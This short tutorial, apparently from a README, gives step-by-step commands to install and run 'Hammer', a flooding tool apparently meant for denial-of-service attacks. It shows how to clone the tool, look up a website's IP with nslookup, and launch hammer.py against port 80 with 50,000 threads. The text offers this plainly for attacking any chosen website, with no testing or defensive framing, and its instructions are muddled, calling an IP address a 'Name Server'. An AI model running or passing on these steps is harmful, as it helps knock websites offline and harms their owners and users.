$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install git<br>
$ apt install dnsutils<br>
$ git clone https://github.com/cyberanand1337x/Hammer/

Hammer need the <b>Name Server</b> of a website which you want to attack...<br>
To get the Name Server...just type<br>
$ <b>nslookup example.com<b><br>
Note the IP Address of that Website<br>

then <br>
$ cd Hammer<br>
$ python3 hammer.py -s 127.0.0.1  -p 80 -t 50000<br>
example:<br>
$ python hammer.py -s [your ip] -p 80 -t 50000<br>
